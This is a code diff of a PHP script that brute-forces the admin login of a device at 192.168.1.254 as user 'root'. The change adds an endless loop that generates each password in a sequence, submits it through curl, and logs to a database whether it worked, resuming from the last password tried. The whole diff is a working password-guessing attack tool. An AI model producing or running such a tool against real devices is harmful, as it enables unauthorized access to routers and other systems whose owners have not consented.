@@ -13,26 +13,26 @@ require_once ("sequence.php");
 //::Classes
 $DB = new DB();
 
-//::Define the string we are going to look in for passwords.
-$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+-={}[]|\\;:<>,./?';
-
 $curl = new Curl();
 $curl->url = "192.168.1.254/login.cgi";
 $curl->username = "root";
 
-$sequence = new Sequence();
+$last = $DB->selectWhere('passwords', null, 'AND', 'ID DESC LIMIT 1');
+$last = $last[0]['password'];
 
-$sequence->run();
+$sequence = new Sequence($last);
 
-$curl->password = "";
+while (true) {
+	$sequence->run();
+	$curl->password = $sequence->getStr();
+	$return = $curl->run();
 
-$return = $curl->run();
-
-//::If there is not an error.
-if (!$curl->stringExists('index.html?msg=err')) {
-
-} else {//If there is an error.
-
+	//::If there is not an error.
+	if (!$curl->stringExists('index.html?msg=err')) {
+		$DB->insertTableRow('passwords', array('password' => $sequence->getStr(), 'worked' => 1));
+	} else {//If there is an error.
+		$DB->insertTableRow('passwords', array('password' => $sequence->getStr(), 'worked' => 0));
+	}
 }
 
 die();
